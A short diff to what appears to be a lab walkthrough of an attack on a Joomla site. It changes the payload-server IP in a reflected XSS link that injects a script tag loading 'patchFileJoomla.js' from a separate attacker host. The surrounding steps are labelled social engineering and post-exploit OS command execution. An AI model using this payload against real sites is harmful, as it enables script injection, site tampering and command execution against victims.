@@ -27,12 +27,12 @@
 4. [social engineering attack] victim user clicks link
 
     ```
-    http://192.168.5.19/test/rxss.php?q=<script src=http://192.168.5.13/patchFileJoomla.js></script>
+    http://192.168.5.19/test/rxss.php?q=<script src=http://192.168.5.15/patchFileJoomla.js></script>
     ```
 
     * **NOTES**:
       * `192.168.5.19` - target Joomla site
-      * `192.168.5.13` - web server hosting payload
+      * `192.168.5.15` - web server hosting payload
 
 5. [post exploit] execute OS command
 
